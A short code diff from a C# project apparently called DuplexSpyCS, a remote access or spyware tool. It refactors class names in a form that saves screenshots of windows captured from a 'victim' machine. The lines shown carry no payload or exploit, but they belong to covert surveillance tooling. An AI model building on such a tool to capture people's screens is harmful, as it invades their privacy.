@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmWindowCapture : Form
     {
-        public Victim v;
+        public clsVictim v;
 
         public frmWindowCapture()
         {
@@ -51,7 +51,7 @@ namespace DuplexSpyCS
 
                 SaveFileDialog sfd = new SaveFileDialog();
                 sfd.InitialDirectory = v.dir_victim;
-                sfd.FileName = C1.GenerateFileName("jpg");
+                sfd.FileName = clsTools.GenerateFileName("jpg");
                 if (sfd.ShowDialog() == DialogResult.OK)
                 {
                     Image img = ((PictureBox)page.Controls[0]).Image;
@@ -88,7 +88,7 @@ namespace DuplexSpyCS
 
                 foreach (TabPage page in tabControl1.TabPages)
                 {
-                    string szFileName = page.Text.Contains("?") ? C1.GenerateFileName("jpg") : $"{page.Text}.jpg";
+                    string szFileName = page.Text.Contains("?") ? clsTools.GenerateFileName("jpg") : $"{page.Text}.jpg";
                     Image img = ((PictureBox)page.Controls[0]).Image;
                     if (img == null)
                     {
